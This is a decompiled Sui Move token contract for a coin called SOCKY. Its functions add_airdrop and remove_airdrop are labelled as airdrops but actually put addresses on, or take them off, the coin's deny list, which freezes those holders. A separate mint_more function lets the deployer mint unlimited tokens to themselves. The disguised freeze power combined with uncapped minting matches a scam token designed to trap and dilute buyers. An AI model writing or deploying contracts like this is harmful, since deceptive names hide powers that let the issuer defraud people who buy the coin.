module 0x7ffcc0a430600622d2eb84b7cc8b552dee48ee62dd590a0b2a15a599e3c33d6b::SOCKY {
    struct SOCKY has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SOCKY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<SOCKY>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: SOCKY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<SOCKY>(arg0, 6, b"SOCKY", b"SOCKY", b"SOCKY", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/QmQcNMvbK3sHLKt31PPrcStpQP1oTVMCQf8LTvKzqSmCkt?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<SOCKY>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<SOCKY>>(0x2::coin::mint<SOCKY>(&mut v3, 1000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<SOCKY>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<SOCKY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<SOCKY>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<SOCKY>>(0x2::coin::mint<SOCKY>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<SOCKY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<SOCKY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

